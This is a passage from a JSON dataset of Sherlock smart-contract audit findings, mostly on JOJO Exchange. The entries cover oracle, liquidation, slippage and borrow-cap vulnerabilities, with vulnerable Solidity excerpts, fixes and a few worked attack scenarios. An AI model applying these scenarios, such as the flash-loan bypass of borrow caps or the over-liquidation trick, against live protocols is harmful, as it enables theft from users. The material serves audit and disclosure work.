      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Blueberry Update #2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-05-blueberry-judging/issues/29",
      "tags": [
        "Check Return Value",
        "Missing-Logic",
        "Fund Lock",
        "Deposit/Reward tokens"
      ],
      "finders": [
        "0x52",
        "nobody2018"
      ]
    },
    {
      "id": "18480",
      "title": "M-13: GeneralRepay#repayJUSD returns excess USDC to `to` address rather than msg.sender",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-jojo-judging/issues/459 \n\n## Found by \n0x52\n## Summary\n\nWhen using GeneralRepay#repayJUSD to repay a position on JUSDBank, any excess tokens are sent to the `to` address. While this is fine for users that are repaying their own debt this is not good when repaying for another user. Additionally, specifying an excess to repay is basically a requirement when attempting to pay off the entire balance of an account. This combination of factors will make it very likely that funds will be refunded incorrectly.\n\n## Vulnerability Detail\n\nhttps://github.com/sherlock-audit/2023-04-jojo/blob/main/JUSDV1/src/Impl/flashloanImpl/GeneralRepay.sol#L65-L69\n\n            IERC20(USDC).approve(jusdExchange, borrowBalance);\n            IJUSDExchange(jusdExchange).buyJUSD(borrowBalance, address(this));\n            IERC20(USDC).safeTransfer(to, USDCAmount - borrowBalance);\n            JUSDAmount = borrowBalance;\n        }\n\nAs seen above, when there is an excess amount of USDC, it is transferred to the `to` address which is the recipient of the repay. When to != msg.sender all excess will be sent to the recipient of the repay rather than being refunded to the caller.\n\n## Impact\n\nRefund is sent to the wrong address if to != msg.sender\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-04-jojo/blob/main/JUSDV1/src/Impl/flashloanImpl/GeneralRepay.sol#L32-L73\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nEither send the excess back to the caller or allow them to specify where the refund goes\n\n\n\n## Discussion\n\n**JoscelynFarr**\n\nfix link: \nhttps://github.com/JOJOexchange/JUSDV1/commit/7382ce40dd54f0a396fb5d3f13ab3cfede0493e2\n\n**IAm0x52**\n\nFix looks good. Excess USDC is now refunded to msg.sender",
      "summary": "\nThis bug report is about the GeneralRepay#repayJUSD function of JUSDBank. This function is used to repay a position on JUSDBank. When using this function, any excess tokens are sent to the `to` address, which is the recipient of the repay. This is fine for users that are repaying their own debt, however, when repaying for another user, this will result in the refund being sent to the wrong address. Additionally, specifying an excess to repay is basically a requirement when attempting to pay off the entire balance of an account, making it very likely that funds will be refunded incorrectly. \n\nThis bug was found by 0x52 and was confirmed by manual review. A code snippet of the vulnerability was provided and a link to the code was provided. The impact of this bug is that the refund is sent to the wrong address if to != msg.sender. \n\nThe recommendation for this bug was to either send the excess back to the caller or allow them to specify where the refund goes. This fix was implemented by JOJOexchange and was confirmed by 0x52.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "JOJO Exchange",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-jojo-judging/issues/459",
      "tags": [],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "18479",
      "title": "M-12: chainlinkAdaptor uses the same heartbeat for both feeds which is highly dangerous",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-jojo-judging/issues/449 \n\n## Found by \n0x52, ast3ros\n## Summary\nchainlinkAdaptor uses the same heartbeat for both feeds when checking if the data feed is fresh. The issue with this is that the [USDC/USD](https://data.chain.link/ethereum/mainnet/stablecoins/usdc-usd) oracle has a 24 hour heartbeat, whereas the [average](https://data.chain.link/ethereum/mainnet/crypto-usd/eth-usd) has a heartbeat of 1 hour. Since they use the same heartbeat the heartbeat needs to be slower of the two or else the contract would be nonfunctional most of the time. The issue is that it would allow the consumption of potentially very stale data from the non-USDC feed.\n\n## Vulnerability Detail\n\nSee summary\n\n## Impact\n\nEither near constant downtime or insufficient staleness checks\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-04-jojo/blob/main/smart-contract-EVM/contracts/adaptor/chainlinkAdaptor.sol#L43-L55\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nUse two separate heartbeat periods\n\n\n\n## Discussion\n\n**JoscelynFarr**\n\nThe contract are trying to get the latest price in here:https://github.com/sherlock-audit/2023-04-jojo/blob/main/smart-contract-EVM/contracts/adaptor/chainlinkAdaptor.sol#LL47C1-L47C1\n\nAnd the heartbeat is trying to prevent chainlink stop updating. It is the same as chainlink's heartbeat.\nhttps://docs.chain.link/data-feeds/price-feeds/addresses/?network=arbitrum#Arbitrum%20Mainnet\n\n**iamjakethehuman**\n\nEscalate for 10 USDC\nI don’t think the sponsor properly understood the issue. On Arbitrum, as well as pretty much any other network, different token pairs have different heartbeats. If the oracle gets the latest price for two pairs with different heartbeats, using the same heartbeat variable for validation would cause either one of the following:\n1. Oracle will be down (will revert) most of the time.\n2. Oracle will allow for stale prices\n\nWhen validating prices for two different token pairs, two different heartbeats must be used.\n\n**sherlock-admin**\n\n > Escalate for 10 USDC\n> I don’t think the sponsor properly understood the issue. On Arbitrum, as well as pretty much any other network, different token pairs have different heartbeats. If the oracle gets the latest price for two pairs with different heartbeats, using the same heartbeat variable for validation would cause either one of the following:\n> 1. Oracle will be down (will revert) most of the time.\n> 2. Oracle will allow for stale prices\n> \n> When validating prices for two different token pairs, two different heartbeats must be used.\n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**JoscelynFarr**\n\nhttps://github.com/JOJOexchange/smart-contract-EVM/commit/c4270e0dc4da0db56173e39d8b6318e47999a07d\nhttps://github.com/JOJOexchange/JUSDV1/commit/f1699ae81e81eb190914d1c2ae491a825389daac\nfix \n\n**hrishibhat**\n\nResult:\nMedium\nHas duplicates\nGiven that the code uses the same heartbeat to validate both assets, when both assets can have different heartbeats, considering this issue a valid medium\n\nSponsor comment:\n> got it, we will accept this issue\n\n\n**sherlock-admin**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [iamjakethehuman](https://github.com/sherlock-audit/2023-04-jojo-judging/issues/449/#issuecomment-1568436039): accepted\n\n**IAm0x52**\n\nFix looks good. Contract now uses separate heartbeats for asset and USDC",
      "summary": "\nIssue M-12 is a bug found by 0x52 and ast3ros in the chainlinkAdaptor contract, which uses the same heartbeat for both feeds when checking if the data feed is fresh. This is highly dangerous as the USDC/USD oracle has a 24 hour heartbeat, whereas the average has a heartbeat of 1 hour. This means that the heartbeat needs to be slower of the two or else the contract would be nonfunctional most of the time, and would allow the consumption of potentially very stale data from the non-USDC feed. \n\nThe code snippet can be found at https://github.com/sherlock-audit/2023-04-jojo/blob/main/smart-contract-EVM/contracts/adaptor/chainlinkAdaptor.sol#L43-L55, and the impact of this bug is either near constant downtime or insufficient staleness checks. The recommendation is to use two separate heartbeat periods. \n\nThe bug was discussed and escalated for 10 USDC, with iamjakethehuman noting that the oracle will be down or allow for stale prices if the same heartbeat is used for both token pairs. This was accepted by the sponsor, and the fix was implemented with a commit at https://github.com/JOJOexchange/smart-contract-EVM/commit/c4270e0dc4da0db56173e39d8b6318e47999a07d and https://github.com/JOJOexchange/JUSDV1/commit/f1699ae81e81eb190914d1c2ae491a825389daac. The fix looks good, and the contract now uses separate heartbeats for asset and USDC.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "JOJO Exchange",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-jojo-judging/issues/449",
      "tags": [
        "Oracle",
        "Chainlink"
      ],
      "finders": [
        "0x52",
        "ast3ros"
      ]
    },
    {
      "id": "18478",
      "title": "M-11: `quoteAllAvailablePoolsWithTimePeriod` can be manipulated with low liquidity pools",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-jojo-judging/issues/438 \n\n## Found by \nArbitraryExecution, GalloDaSballo, deadrxsezzz\n## Summary\n\n`quoteAllAvailablePoolsWithTimePeriod` can be manipulated with low liquidity pools, and there exist Uniswap V3 pools on Arbitrum that JOJO may quote the price from that are low liquidity and therefore manipulatable.\n\n## Vulnerability Detail\n\nThe [`quoteAllAvailablePoolsWithTimePeriod` function](https://github.com/Mean-Finance/uniswap-v3-oracle/blob/9935263665c5a16f9c385e909bcc6edcc8d56970/solidity/contracts/StaticOracle.sol#L53) from the `StaticOracle` contract is used in the `getMarkPrice` function of `uniswapPriceAdaptor.sol` to retrieve the weighted arithmetic mean of the tick prices of all applicable Uniswap V3 pools for the given `period`. However, the returned price can potentially be manipulated if the liquidity of a queried pool is low enough. This is because the arithmetic mean is susceptible to outliers. The potential for Uniswap V3 pools to be manipulated is usually considered a theoretical vulnerability for high-liquidity pools. However, there are specific instances of low liquidity Uniswap V3 pools on Arbitrum that JOJO will attempt to quote a price from, therefore making manipulation a real attack vector.\n\nIn one such instance, the deployed [`StaticOracle`](https://arbiscan.io/address/0xb210ce856631eeeb767efa666ec7c1c57738d438) contract that JOJO intends to use on Arbitrum returns the following three Uniswap V3 pools for the WBTC/USDC pair: [`0xac70bD92F89e6739B3a08Db9B6081a923912f73D`](https://arbiscan.io/address/0xac70bD92F89e6739B3a08Db9B6081a923912f73D), [`0xA62aD78825E3a55A77823F00Fe0050F567c1e4EE`](https://arbiscan.io/address/0xA62aD78825E3a55A77823F00Fe0050F567c1e4EE), and [`0x83450968eC7606F98Df1C170f8C922d55A13f236`](https://arbiscan.io/address/0x83450968eC7606F98Df1C170f8C922d55A13f236). Two of the three pools have low liquidity, which makes the average arithmetic mean of the three pools manipulatable.\n\n## Impact\n\nManipulating the price of a token used in a perpetual opens up the opportunity for arbitrage on the JOJO protocol which in turn could increase counterparty risk. Additionally, if the price exceeds the allowed difference set by JOJO, this could cause a permanent DOS of the `uniswapPriceAdaptor` and `emergencyOracle` fallback oracle mechanism. Despite this oracle mechanism being the fallback to Chainlink, a permanent DOS of the backup price oracle system should be considered a critical failure.\n\n## Code Snippet\n\nhttps://github.com/Mean-Finance/uniswap-v3-oracle/blob/9935263665c5a16f9c385e909bcc6edcc8d56970/solidity/contracts/StaticOracle.sol#L158-L174\n\n```solidity\nfunction _quote(\n    uint128 _baseAmount,\n    address _baseToken,\n    address _quoteToken,\n    address[] memory _pools,\n    uint32 _period\n  ) internal view returns (uint256 _quoteAmount) {\n    require(_pools.length > 0, 'No defined pools');\n    OracleLibrary.WeightedTickData[] memory _tickData = new OracleLibrary.WeightedTickData[](_pools.length);\n    for (uint256 i; i < _pools.length; i++) {\n      (_tickData[i].tick, _tickData[i].weight) = _period > 0\n        ? OracleLibrary.consult(_pools[i], _period)\n        : OracleLibrary.getBlockStartingTickAndLiquidity(_pools[i]);\n    }\n    int24 _weightedTick = _tickData.length == 1 ? _tickData[0].tick : OracleLibrary.getWeightedArithmeticMeanTick(_tickData);\n    return OracleLibrary.getQuoteAtTick(_weightedTick, _baseAmount, _baseToken, _quoteToken);\n}\n```\n\n## Tool used\n\nManual review.\n\n## Recommendation\n\nJOJO should consider replacing `quoteAllAvailablePoolsWithTimePeriod` with [`quoteSpecificPoolsWithTimePeriod`](https://github.com/Mean-Finance/uniswap-v3-oracle/blob/main/solidity/contracts/StaticOracle.sol#L77) and selecting a subset of Uniswap V3 pools with sufficient liquidity to avoid price manipulation.\n\n\n\n\n\n## Discussion\n\n**JoscelynFarr**\n\nfix link:\nhttps://github.com/JOJOexchange/smart-contract-EVM/commit/1dbc9001be667af42952c110e9fdf04fd7826669\nhttps://github.com/JOJOexchange/JUSDV1/commit/eed86242c2be0cd70e6b412124eb05ed5e3c92dc\n\n**IAm0x52**\n\nFixes look good. Pools are now specified instead of being pulled dynamically",
      "summary": "\nIssue M-11 is about the vulnerability of `quoteAllAvailablePoolsWithTimePeriod` function from the `StaticOracle` contract in the `getMarkPrice` function of `uniswapPriceAdaptor.sol`. This function is used to retrieve the weighted arithmetic mean of the tick prices of all applicable Uniswap V3 pools for the given `period`. It was found that the returned price can be manipulated if the liquidity of a queried pool is low enough, as the arithmetic mean is susceptible to outliers. This vulnerability was found by ArbitraryExecution, GalloDaSballo, and deadrxsezzz.\n\nIn one instance, the deployed `StaticOracle` contract that JOJO intends to use on Arbitrum returns three Uniswap V3 pools for the WBTC/USDC pair with two of them having low liquidity, making the average arithmetic mean of the three pools manipulatable. This opens up the opportunity for arbitrage on the JOJO protocol which can increase counterparty risk. Additionally, if the price exceeds the allowed difference set by JOJO, this could cause a permanent DOS of the `uniswapPriceAdaptor` and `emergencyOracle` fallback oracle mechanism.\n\nTo fix this issue, JOJO should consider replacing `quoteAllAvailablePoolsWithTimePeriod` with `quoteSpecificPoolsWithTimePeriod` and selecting a subset of Uniswap V3 pools with sufficient liquidity to avoid price manipulation. Fixes have been implemented with links provided, which look good as pools are now specified instead of being pulled dynamically.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "JOJO Exchange",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-jojo-judging/issues/438",
      "tags": [],
      "finders": [
        "deadrxsezzz",
        "GalloDaSballo",
        "ArbitraryExecution"
      ]
    },
    {
      "id": "18477",
      "title": "M-10: JUSDBank users can bypass individual collateral borrow limits",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-jojo-judging/issues/403 \n\n## Found by \n0x52, Ace-30, GalloDaSballo, J4de, carrotsmuggler, peakbolt\n## Summary\n\nJUSDBank imposes individual borrow caps on each collateral. The issue is that this can be bypassed due to the fact that withdraw and borrow use different methods to determine if an account is safe. \n\n## Vulnerability Detail\n\nhttps://github.com/sherlock-audit/2023-04-jojo/blob/main/JUSDV1/src/Impl/JUSDBank.sol#L105-L117\n\n        function borrow(\n            uint256 amount,\n            address to,\n            bool isDepositToJOJO\n        ) external override nonReentrant nonFlashLoanReentrant{\n            //     t0BorrowedAmount = borrowedAmount /  getT0Rate\n            DataTypes.UserInfo storage user = userInfo[msg.sender];\n            _borrow(user, isDepositToJOJO, to, amount, msg.sender);\n            require(\n                _isAccountSafeAfterBorrow(user, getTRate()),\n                JUSDErrors.AFTER_BORROW_ACCOUNT_IS_NOT_SAFE\n            );\n        }\n\nWhen borrowing the contract calls _isAccountSafeAfterBorrow. This imposes a max borrow on each collateral type that guarantees that the user cannot borrow more than the max for each collateral type. The issues is that withdraw doesn't impose this cap. This allows a user to bypass this cap as shown in the example below.\n\nExample:\nAssume WETH and WBTC both have a cap of 10,000 borrow. The user deposits $30,000 WETH and takes a flashloand for $30,000 WBTC. Now they deposit both and borrow 20,000 JUSD. They then withdraw all their WBTC to repay the flashloan and now they have borrowed 20,000 against $30000 in WETH\n\n## Impact\n\nDeposit caps can be easily surpassed creating systematic risk for the system\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-04-jojo/blob/main/JUSDV1/src/Impl/JUSDBank.sol#L105-L117\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAlways use _isAccountSafeAfterBorrow\n\n\n\n## Discussion\n\n**JoscelynFarr**\n\nfix link:\nhttps://github.com/JOJOexchange/JUSDV1/commit/611ce809ab1c3c300d888053bea6960ed69ec3c3\nhttps://github.com/JOJOexchange/JUSDV1/commit/0ba5d98aac0e8109f38ebf2382bf84391a7c846b\n\n**IAm0x52**\n\nFixes look good. Borrow specific functions have been replaced with the generic checks, preventing this issue",
      "summary": "\nThis bug report is about JUSDBank users being able to bypass individual collateral borrow limits. This issue was found by 0x52, Ace-30, GalloDaSballo, J4de, carrotsmuggler, and peakbolt. When borrowing, the contract calls _isAccountSafeAfterBorrow, which imposes a max borrow on each collateral type. The issue is that withdraw doesn't impose this cap, allowing a user to bypass the cap. This creates systematic risk for the system. The code snippet and recommendation to always use _isAccountSafeAfterBorrow are also provided. Fixes for this issue were suggested by JoscelynFarr and confirmed by IAm0x52.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "JOJO Exchange",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-jojo-judging/issues/403",
      "tags": [],
      "finders": [
        "carrotsmuggler",
        "J4de",
        "0x52",
        "peakbolt",
        "GalloDaSballo",
        "Ace-30"
      ]
    },
    {
      "id": "18476",
      "title": "M-9: FlashLoanLiquidate.JOJOFlashLoan has no slippage control when swapping USDC",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-jojo-judging/issues/373 \n\n## Found by \n0x52, 0xStalin, Aymen0909, Bauer, Nyx, T1MOH, cccz, peakbolt, rvierdiiev\n## Summary\nFlashLoanLiquidate.JOJOFlashLoan has no slippage control when swapping USDC\n## Vulnerability Detail\nIn both GeneralRepay.repayJUSD and FlashLoanRepay.JOJOFlashLoan, the user-supplied minReceive parameter is used for slippage control when swapping USDC. \n```solidity\n    function JOJOFlashLoan(\n        address asset,\n        uint256 amount,\n        address to,\n        bytes calldata param\n    ) external {\n        (address approveTarget, address swapTarget, uint256 minReceive, bytes memory data) = abi\n            .decode(param, (address, address, uint256, bytes));\n        IERC20(asset).approve(approveTarget, amount);\n        (bool success, ) = swapTarget.call(data);\n        if (success == false) {\n            assembly {\n                let ptr := mload(0x40)\n                let size := returndatasize()\n                returndatacopy(ptr, 0, size)\n                revert(ptr, size)\n            }\n        }\n        uint256 USDCAmount = IERC20(USDC).balanceOf(address(this));\n        require(USDCAmount >= minReceive, \"receive amount is too small\");\n...\n    function repayJUSD(\n        address asset,\n        uint256 amount,\n        address to,\n        bytes memory param\n    ) external {\n        IERC20(asset).safeTransferFrom(msg.sender, address(this), amount);\n        uint256 minReceive;\n        if (asset != USDC) {\n            (address approveTarget, address swapTarget, uint256 minAmount, bytes memory data) = abi\n                .decode(param, (address, address, uint256, bytes));\n            IERC20(asset).approve(approveTarget, amount);\n            (bool success, ) = swapTarget.call(data);\n            if (success == false) {\n                assembly {\n                    let ptr := mload(0x40)\n                    let size := returndatasize()\n                    returndatacopy(ptr, 0, size)\n                    revert(ptr, size)\n                }\n            }\n            minReceive = minAmount;\n        }\n\n        uint256 USDCAmount = IERC20(USDC).balanceOf(address(this));\n        require(USDCAmount >= minReceive, \"receive amount is too small\");\n```\nHowever, this is not done in FlashLoanLiquidate.JOJOFlashLoan, and the lack of slippage control may expose the user to sandwich attacks when swapping USDC.\n## Impact\nThe lack of slippage control may expose the user to sandwich attacks when swapping USDC.\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-04-jojo/blob/main/JUSDV1/src/Impl/flashloanImpl/FlashLoanLiquidate.sol#L46-L78\n\n## Tool used\n\nManual Review\n\n## Recommendation\nConsider making FlashLoanLiquidate.JOJOFlashLoan use the minReceive parameter for slippage control when swapping USDC.\n\n\n\n## Discussion\n\n**JoscelynFarr**\n\nfix link: https://github.com/JOJOexchange/JUSDV1/commit/b0e7d27cf484d9406a267a1b38ac253113101e8e\n\n**IAm0x52**\n\nFix looks good. JOJOFlashloan now validates minReceived when swapping",
      "summary": "\nThis bug report is about FlashLoanLiquidate.JOJOFlashLoan, a part of the JOJO exchange. The issue is that this function has no slippage control when swapping USDC, which could expose users to sandwich attacks. The bug was found by 0x52, 0xStalin, Aymen0909, Bauer, Nyx, T1MOH, cccz, peakbolt, and rvierdiiev. They used manual review for their investigation. \n\nThe code snippet provided shows that GeneralRepay.repayJUSD and FlashLoanRepay.JOJOFlashLoan both use the user-supplied minReceive parameter for slippage control when swapping USDC. However, FlashLoanLiquidate.JOJOFlashLoan does not, which is the issue. \n\nThe impact of this bug is that users may be exposed to sandwich attacks when swapping USDC. JoscelynFarr then provided a link to the fix, which was confirmed by IAm0x52. The fix was to make FlashLoanLiquidate.JOJOFlashLoan use the minReceive parameter for slippage control when swapping USDC.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "JOJO Exchange",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-jojo-judging/issues/373",
      "tags": [],
      "finders": [
        "0xStalin",
        "Bauer",
        "0x52",
        "cccz",
        "Nyx",
        "peakbolt",
        "T1MOH",
        "Aymen0909",
        "rvierdiiev"
      ]
    },
    {
      "id": "18475",
      "title": "M-8: In over liquidation, if the liquidatee has USDC-denominated assets for sale, the liquidator can buy the assets with USDC to avoid paying USDC to the liquidatee",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-jojo-judging/issues/369 \n\n## Found by \ncccz, monrel\n## Summary\nIn over liquidation, if the liquidatee has USDC-denominated assets for sale, the liquidator can buy the assets with USDC to avoid paying USDC to the liquidatee\n## Vulnerability Detail\nIn JUSDBank contract, if the liquidator wants to liquidate more collateral than the borrowings of the liquidatee, the liquidator can pay additional USDC to get the liquidatee's collateral. \n```solidity\n        } else {\n            //            actualJUSD = actualCollateral * priceOff\n            //            = JUSDBorrowed * priceOff / priceOff * (1-insuranceFeeRate)\n            //            = JUSDBorrowed / (1-insuranceFeeRate)\n            //            insuranceFee = actualJUSD * insuranceFeeRate\n            //            = actualCollateral * priceOff * insuranceFeeRate\n            //            = JUSDBorrowed * insuranceFeeRate / (1- insuranceFeeRate)\n            liquidateData.actualCollateral = JUSDBorrowed\n                .decimalDiv(priceOff)\n                .decimalDiv(JOJOConstant.ONE - reserve.insuranceFeeRate);\n            liquidateData.insuranceFee = JUSDBorrowed\n                .decimalMul(reserve.insuranceFeeRate)\n                .decimalDiv(JOJOConstant.ONE - reserve.insuranceFeeRate);\n            liquidateData.actualLiquidatedT0 = liquidatedInfo.t0BorrowBalance;\n            liquidateData.actualLiquidated = JUSDBorrowed;\n        }\n\n        liquidateData.liquidatedRemainUSDC = (amount -\n            liquidateData.actualCollateral).decimalMul(price);\n```\nThe liquidator needs to pay USDC in the callback and the JUSDBank contract will require the final USDC balance of the liquidatee to increase.\n```solidity\n        require(\n            IERC20(primaryAsset).balanceOf(liquidated) -\n                primaryLiquidatedAmount >=\n                liquidateData.liquidatedRemainUSDC,\n            JUSDErrors.LIQUIDATED_AMOUNT_NOT_ENOUGH\n        );\n```\nIf the liquidatee has USDC-denominated assets for sale, the liquidator can purchase the assets with USDC in the callback, so that the liquidatee's USDC balance will increase and the liquidator will not need to send USDC to the liquidatee to pass the check in the JUSDBank contract.\n## Impact\nIn case of over liquidation, the liquidator does not need to pay additional USDC to the liquidatee\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-04-jojo/blob/main/JUSDV1/src/Impl/JUSDBank.sol#L188-L204\n\n## Tool used\n\nManual Review\n\n## Recommendation\nConsider banning over liquidation\n\n\n\n## Discussion\n\n**JoscelynFarr**\n\nThat is in our consideration, if the liquidation triggered, there is a possibility for liquidator to liquidate all collaterals, and the remain collateral will return by the USDC to liquidatee\n\n**JoscelynFarr**\n\nIn fact, I don't understand how the attack occurs\n\n**Trumpero**\n\nThis issue states that the USDC balance of a liquidated user will be validated as the result of liquidation. However, the liquidator can purchase USDC instead of directly transfer USDC in the callback function (when the liquidated user sells USDC elsewhere). After that, the balance check for liquidation is still fulfilled, but the liquidated user will lose assets.\n\n**hrishibhat**\n\nAdditional comment from the Watson:\n\nAssume liquidationPriceOff = 5% and ETH : USDC = 2000 : 1.\nAlice's unhealthy position is borrowed for 100000 JUSD, collateral is 60 ETH, meanwhile Alice sells 7 ETH for 14000 USDC in other protocol.\nBob liquidates 60 ETH of Alice's position, Bob needs to pay 100000 JUSD, and 60 * 2000 - 100000 / 0.95 = 14737 USDC. In the JOJOFlashLoan callback, Bob sends 100000 JUSD to the contract and buys the 7 ETH that Alice sold in the other protocol (It increases Alice's USDC balance by 14000), and then Bob just send another 14737-14000=737 USDC to Alice to pass the following check\n```\n        require(\n            IERC20(primaryAsset).balanceOf(liquidated) -\n                primaryLiquidatedAmount >=\n                liquidateData.liquidatedRemainUSDC,\n            JUSDErrors.LIQUIDATED_AMOUNT_NOT_ENOUGH\n        );\n```\n\n**JoscelynFarr**\n\nfix commit:\nhttps://github.com/JOJOexchange/JUSDV1/commit/5918d68be9b5b021691f768da98df5f712ac6edd\n\n**IAm0x52**\n\nNeed validation of amount sent to `liquidated`\n\n**IAm0x52**\n\nFix looks good. Reentrancy exists if _primaryAsset is also a collateral but team has explicitly stated that this is never the case.",
      "summary": "\nIssue M-8 is a vulnerability found in the JUSDBank contract which allows the liquidator to avoid paying USDC to the liquidatee if the liquidatee has USDC-denominated assets for sale. The vulnerability occurs when the liquidator wants to liquidate more collateral than the borrowings of the liquidatee. In this case, the liquidator needs to pay additional USDC to get the liquidatee’s collateral. The liquidator can purchase the assets with USDC in the callback, so that the liquidatee’s USDC balance will increase and the liquidator will not need to send USDC to the liquidatee to pass the check in the JUSDBank contract. \n\nThe vulnerability was found by cccz and monrel through manual review. The potential impact of this vulnerability is that in case of over liquidation, the liquidator does not need to pay additional USDC to the liquidatee. The code snippet for this vulnerability can be found at https://github.com/sherlock-audit/2023-04-jojo/blob/main/JUSDV1/src/Impl/JUSDBank.sol#L188-L204. \n\nThe team has recommended to consider banning over liquidation. To fix this issue, a commit was made at https://github.com/JOJOexchange/JUSDV1/commit/5918d68be9b5b021691f768da98df5f712ac6edd which also validates the amount sent to the liquidated. The fix looks good and reentrancy exists if the primaryAsset is also a collateral, but the team has explicitly stated that this is never the case.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "JOJO Exchange",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-jojo-judging/issues/369",
      "tags": [],
      "finders": [
        "cccz",
        "monrel"
      ]
    },
    {
      "id": "18474",
      "title": "M-7: UniswapPriceAdaptor fails after updating impact",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-04-jojo-judging/issues/364 \n\n## Found by \nast3ros\n## Summary\n\nThe `impact` variable can have a maximum value of `uint32` (=4.294.967.295) after updating. This is too low and will cause the `UniswapPriceAdaptor#getMarkPrice()` function to revert.\n\n## Vulnerability Detail\n\nWhen initialized, the `impact` variable is a `uint256`. However, in the `updateImpact` function, the newImpact is a `uint32`.\n\n```javascript\n    function updateImpact(uint32 newImpact) external onlyOwner {\n        emit UpdateImpact(impact, newImpact);\n        impact = newImpact;\n    }\n```\n\nThe new `impact` variable will be too small because in the getMarkPrice() function, we need `diff * 1e18 / JOJOPriceFeed <= impact`:\n        \n        require(diff * 1e18 / JOJOPriceFeed <= impact, \"deviation is too big\");\n\nThe result of `diff * 1e18 / JOJOPriceFeed <= impact` is a number with e18 power. It is very likely that it is larger than the `impact` variable which is a `uint32`. The function getMarkPrice() will revert.\n\n## Impact\n\nThe UniswapPriceAdaptor will malfunction and not return the price from Uniswap Oracle.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-04-jojo/blob/main/smart-contract-EVM/contracts/adaptor/uniswapPriceAdaptor.sol#L52\nhttps://github.com/sherlock-audit/2023-04-jojo/blob/main/smart-contract-EVM/contracts/adaptor/uniswapPriceAdaptor.sol#L61-L64\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nChange the newImpact argument from uint32 to uint256.\n\n```diff\n-    function updateImpact(uint32 newImpact) external onlyOwner {\n+    function updateImpact(uint256 newImpact) external onlyOwner {        \n        emit UpdateImpact(impact, newImpact);\n        impact = newImpact;\n    }\n\n```\n\n\n\n## Discussion\n\n**JoscelynFarr**\n\nfix link:\nhttps://github.com/JOJOexchange/smart-contract-EVM/commit/6138d912bdfe7e644b74a182749ab79bb5dc6028\nhttps://github.com/JOJOexchange/JUSDV1/commit/cc6c7518719406923e4678478b7ea0eebfa0b079\n\n**JoscelynFarr**\n\nAnd we also think this is a low issues to update uint32 to uint256\n\n**thangtranth**\n\nEscalate for 10 USDC.\n\nThe impact of this issue is that “The UniswapPriceAdaptor will malfunction and not return the price from Uniswap Oracle”. This breaks the functionality of the protocol as explained above and therefore it definitely qualifies as a medium issue. The simplicity of the fix does not imply a low severity issue.\n\n**sherlock-admin**\n\n > Escalate for 10 USDC.\n> \n> The impact of this issue is that “The UniswapPriceAdaptor will malfunction and not return the price from Uniswap Oracle”. This breaks the functionality of the protocol as explained above and therefore it definitely qualifies as a medium issue. The simplicity of the fix does not imply a low severity issue.\n\nYou've created a valid escalation for 10 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**JoscelynFarr**\n\nOk\n\n**hrishibhat**\n\nResult:\nMedium\nUnique\nThis is a valid medium issue as pointed out by the escalation \n\n**sherlock-admin**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [thangtranth](https://github.com/sherlock-audit/2023-04-jojo-judging/issues/364/#issuecomment-1568663166): accepted\n\n**IAm0x52**\n\nFix looks good. Type of newImpact changed from uint32 to uint256",
      "summary": "\nThis bug report is about the UniswapPriceAdaptor, which is a part of the JOJOexchange protocol. The issue was found by ast3ros and the impact of this issue is that the UniswapPriceAdaptor will malfunction and not return the price from Uniswap Oracle. The root cause of this issue is that the `impact` variable is a `uint256` when initialized, but in the `updateImpact` function, the newImpact is a `uint32`. This is too low and will cause the `UniswapPriceAdaptor#getMarkPrice()` function to revert. The code snippet and link to the code were provided. Manual review was used as a tool. The recommendation is to change the newImpact argument from uint32 to uint256. The issue was discussed and the result is that it is a valid medium issue. Finally, the fix looks good and the type of newImpact was changed from uint32 to uint256.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "JOJO Exchange",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-04-jojo-judging/issues/364",
      "tags": [],
      "finders": [
        "ast3ros"
      ]
    },
    {
